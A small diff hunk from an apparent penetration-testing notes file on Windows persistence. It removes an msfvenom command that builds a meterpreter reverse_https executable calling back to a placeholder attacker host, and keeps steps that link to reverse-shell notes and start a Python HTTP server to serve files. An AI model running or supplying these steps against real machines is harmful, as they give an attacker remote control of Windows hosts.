@@ -207,9 +207,6 @@ PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} 
 ```
 ### Persistance
 * [Generate meterpreter payload](../../../../Tools/Metasploit/README.md#HTTPS-Reverse-Shell-with-Impersonate-SSL).
-```bash
-msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f exe > payload.exe
-```
 * Start HTTP Server.
 ```bash
 python -m SimpleHTTPServer 80
